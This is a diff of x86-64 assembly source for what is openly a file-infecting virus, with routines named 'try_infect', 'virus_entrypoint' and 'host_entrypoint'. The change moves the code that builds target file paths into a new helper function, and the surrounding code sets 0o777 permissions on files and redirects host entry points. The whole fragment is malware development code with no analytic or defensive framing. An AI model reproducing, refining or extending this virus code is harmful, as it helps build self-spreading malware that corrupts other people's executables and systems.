@@ -254,16 +254,8 @@ try_infect:
     mov rsi, r14
     mov rax, rdi
     lea rdi, data(file_path)
-    mov rdx, rdi
-    .directory_name:
-        movsb
-        cmp BYTE [rsi], 0
-        jnz .directory_name
-        mov rsi, rax
-    .file_name:
-        movsb
-        cmp BYTE [rsi - 1], 0
-        jnz .file_name
+    call get_full_path
+
     mov rdi, rdx
     push rdi
     mov rsi, 0o777
@@ -415,6 +407,21 @@ get_base_address:
     mov rdx, [rel virus_entrypoint]
     sub rax, rdx
     add rax, [rel host_entrypoint]
+    ret
+
+; void get_full_path(rdi=char*, rsi=char*)
+; Appends the file name (rsi) to the directory name (rdi).
+get_full_path:
+    mov rdx, rdi
+    .directory_name:
+        movsb
+        cmp BYTE [rsi], 0
+        jnz .directory_name
+        mov rsi, rax
+    .file_name:
+        movsb
+        cmp BYTE [rsi - 1], 0
+        jnz .file_name
     ret
 
 ; int try_open(rdi=char*, rsi=flags, rdx=mode, rcx=callback)
